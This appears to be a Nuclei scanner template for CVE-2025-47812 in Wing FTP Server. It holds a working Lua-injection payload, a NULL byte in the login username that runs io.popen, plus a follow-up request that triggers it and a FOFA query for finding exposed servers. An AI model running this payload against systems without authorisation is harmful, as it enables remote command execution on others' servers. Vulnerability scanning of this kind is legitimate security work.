http:
    - extractors:
        - group: 1
          internal: true
          name: phpsessid
          part: header
          regex:
            - UID=(.*?)
          type: regex
      raw:
        - |
          POST /loginok.html HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Content-Type: application/x-www-form-urlencoded

          username=anonymous%00]]%0dlocal+h+%3d+io.popen("echo {{username}}")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password=
    - matchers:
        - part: body
          type: word
          words:
            - '{{username}}'
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /dir.html HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
          Cookie: {{phpsessid}}
id: WingFtpServer-RCE-CVE-2025-47812
info:
    author: Superhero
    description: |-
        fofa: icon_hash="963565804" || title="Wing FTP Server"
        该漏洞是由于登录时 'username' 参数中的 NULL 字节处理不当导致的，该漏洞允许 Lua 代码注入导入到会话文件中。这些注入的会话文件在访问经过身份验证的端点（如 /dir.html）时执行，从而导致命令执行
    name: WingFtpServer 远程命令执行漏洞 (CVE-2025-47812)
    reference:
        - https://mp.weixin.qq.com/s/wSv-WkEDhwEYra6SV98gOA
    severity: high
    tags:
        - RCE
variables:
    username: '{{to_lower(rand_base(10))}}'
